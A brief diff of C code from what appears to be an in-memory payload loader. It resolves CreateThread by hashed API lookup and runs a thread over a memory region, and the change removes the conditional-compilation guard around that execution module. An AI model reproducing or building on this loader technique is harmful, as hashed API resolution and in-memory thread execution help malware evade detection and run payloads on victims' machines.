@@ -9,7 +9,7 @@
 
 
 
-#ifdef EXECUTION_CREATETHREAD_LOCAL
+
 BOOL execution_load_apis() {
 	g_ldr->apis->CreateThread = (pCreateThread)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATETHREAD);
 	if (g_ldr->apis->CreateThread == NULL) {
@@ -24,5 +24,5 @@ BOOL execution_run(MemoryInfo memInfo) {
 	WaitForSingleObject(hThread, INFINITE);
 	return TRUE;
 }
-#endif
+
 
